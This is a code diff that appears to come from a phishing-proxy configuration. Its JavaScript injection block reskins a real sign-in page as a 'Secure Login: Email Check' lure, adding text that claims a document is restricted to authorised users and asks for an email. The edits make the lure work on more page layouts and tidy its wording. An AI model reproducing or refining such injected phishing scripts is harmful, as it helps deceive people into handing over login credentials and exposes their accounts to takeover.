@@ -141,20 +141,18 @@ js_inject:
             }
 
             if (headerTitle) {
-              headerTitle.querySelector("div").textContent = "Secure Login: Email Check";
-              headerTitle.style.marginBottom = "12px";
-              headerTitle.style.fontSize = "22px";
-              headerTitle.style.color = "#004e9b";
+              const heading = headerTitle.querySelector('[role="heading"], h1, div');
+              if (heading) heading.textContent = "Secure Login: Email Check";
 
               const subtitle = document.createElement("p");
-              subtitle.textContent = "Access to this document is restricted to Authorised users only. kindly enter your email";
+              subtitle.textContent = "Access to this document is restricted to Authorised users only. Kindly enter your email";
               subtitle.style.fontSize = "13px";
               subtitle.style.margin = "4px 0 12px 0";
               subtitle.style.color = "#333";
               headerTitle.appendChild(subtitle);
             }
 
-            const inputRow = emailInput.closest(".form-group");
+            const inputRow = emailInput.closest(".form-group") || emailInput.parentElement;
             if (inputRow) {
               const description = document.createElement("p");
               description.textContent = "This document is accessible by authorized users only. Please provide your email for access.";
